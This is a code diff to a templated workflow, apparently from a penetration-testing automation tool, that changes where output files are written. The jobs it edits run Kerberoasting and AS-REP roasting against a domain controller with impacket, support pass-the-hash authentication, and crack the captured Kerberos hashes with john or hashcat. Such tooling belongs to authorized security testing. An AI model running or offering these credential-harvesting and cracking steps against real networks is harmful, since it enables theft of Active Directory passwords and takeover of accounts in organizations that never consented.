@@ -51,12 +51,12 @@ jobs:
         EXTRA="-hashes :{{ inputs.hash }}"
         {% endif %}
 
-        impacket-GetUserSPNs "$AUTH" -dc-ip {{ inputs.target }} -request -outputfile /tmp/ofx_kerberoast.txt $EXTRA 2>&1 | tee /tmp/ofx_kerberoast_log.txt
+        impacket-GetUserSPNs "$AUTH" -dc-ip {{ inputs.target }} -request -outputfile ${OFX_RUN_DIR:-/tmp}/ofx_kerberoast.txt $EXTRA 2>&1 | tee ${OFX_RUN_DIR:-/tmp}/ofx_kerberoast_log.txt
 
-        if [ -f /tmp/ofx_kerberoast.txt ]; then
-          COUNT=$(wc -l < /tmp/ofx_kerberoast.txt)
+        if [ -f ${OFX_RUN_DIR:-/tmp}/ofx_kerberoast.txt ]; then
+          COUNT=$(wc -l < ${OFX_RUN_DIR:-/tmp}/ofx_kerberoast.txt)
           echo "hash_count=$COUNT" >> {{ env.OFX_OUTPUTS }}
-          echo "hash_file=/tmp/ofx_kerberoast.txt" >> {{ env.OFX_OUTPUTS }}
+          echo "hash_file=${OFX_RUN_DIR:-/tmp}/ofx_kerberoast.txt" >> {{ env.OFX_OUTPUTS }}
           echo "[+] Got $COUNT TGS hashes"
         else
           echo "hash_count=0" >> {{ env.OFX_OUTPUTS }}
@@ -82,12 +82,12 @@ jobs:
         EXTRA="-hashes :{{ inputs.hash }}"
         {% endif %}
 
-        impacket-GetNPUsers "$AUTH" -dc-ip {{ inputs.target }} -request -outputfile /tmp/ofx_asrep.txt $EXTRA 2>&1 | tee /tmp/ofx_asrep_log.txt
+        impacket-GetNPUsers "$AUTH" -dc-ip {{ inputs.target }} -request -outputfile ${OFX_RUN_DIR:-/tmp}/ofx_asrep.txt $EXTRA 2>&1 | tee ${OFX_RUN_DIR:-/tmp}/ofx_asrep_log.txt
 
-        if [ -f /tmp/ofx_asrep.txt ]; then
-          COUNT=$(wc -l < /tmp/ofx_asrep.txt)
+        if [ -f ${OFX_RUN_DIR:-/tmp}/ofx_asrep.txt ]; then
+          COUNT=$(wc -l < ${OFX_RUN_DIR:-/tmp}/ofx_asrep.txt)
           echo "asrep_count=$COUNT" >> {{ env.OFX_OUTPUTS }}
-          echo "asrep_file=/tmp/ofx_asrep.txt" >> {{ env.OFX_OUTPUTS }}
+          echo "asrep_file=${OFX_RUN_DIR:-/tmp}/ofx_asrep.txt" >> {{ env.OFX_OUTPUTS }}
           echo "[+] Got $COUNT AS-REP hashes"
         else
           echo "asrep_count=0" >> {{ env.OFX_OUTPUTS }}
@@ -107,10 +107,10 @@ jobs:
         {% if jobs['kerberoast'].outputs.hash_count | default(0, true) | int > 0 %}
         echo "--- Kerberoast (TGS) ---"
         if command -v john &>/dev/null; then
-          john --wordlist={{ inputs.wordlist }} /tmp/ofx_kerberoast.txt 2>/dev/null
-          john --show /tmp/ofx_kerberoast.txt 2>/dev/null | tee /tmp/ofx_kerberoast_cracked.txt
+          john --wordlist={{ inputs.wordlist }} ${OFX_RUN_DIR:-/tmp}/ofx_kerberoast.txt 2>/dev/null
+          john --show ${OFX_RUN_DIR:-/tmp}/ofx_kerberoast.txt 2>/dev/null | tee ${OFX_RUN_DIR:-/tmp}/ofx_kerberoast_cracked.txt
         elif command -v hashcat &>/dev/null; then
-          hashcat -m 13100 /tmp/ofx_kerberoast.txt {{ inputs.wordlist }} --force -o /tmp/ofx_kerberoast_cracked.txt 2>/dev/null || true
+          hashcat -m 13100 ${OFX_RUN_DIR:-/tmp}/ofx_kerberoast.txt {{ inputs.wordlist }} --force -o ${OFX_RUN_DIR:-/tmp}/ofx_kerberoast_cracked.txt 2>/dev/null || true
         fi
         {% endif %}
 
@@ -118,10 +118,10 @@ jobs:
         {% if jobs['asrep-roast'].outputs.asrep_count | default(0, true) | int > 0 %}
         echo "--- AS-REP ---"
         if command -v john &>/dev/null; then
-          john --wordlist={{ inputs.wordlist }} /tmp/ofx_asrep.txt 2>/dev/null
-          john --show /tmp/ofx_asrep.txt 2>/dev/null | tee /tmp/ofx_asrep_cracked.txt
+          john --wordlist={{ inputs.wordlist }} ${OFX_RUN_DIR:-/tmp}/ofx_asrep.txt 2>/dev/null
+          john --show ${OFX_RUN_DIR:-/tmp}/ofx_asrep.txt 2>/dev/null | tee ${OFX_RUN_DIR:-/tmp}/ofx_asrep_cracked.txt
         elif command -v hashcat &>/dev/null; then
-          hashcat -m 18200 /tmp/ofx_asrep.txt {{ inputs.wordlist }} --force -o /tmp/ofx_asrep_cracked.txt 2>/dev/null || true
+          hashcat -m 18200 ${OFX_RUN_DIR:-/tmp}/ofx_asrep.txt {{ inputs.wordlist }} --force -o ${OFX_RUN_DIR:-/tmp}/ofx_asrep_cracked.txt 2>/dev/null || true
         fi
         {% endif %}
 
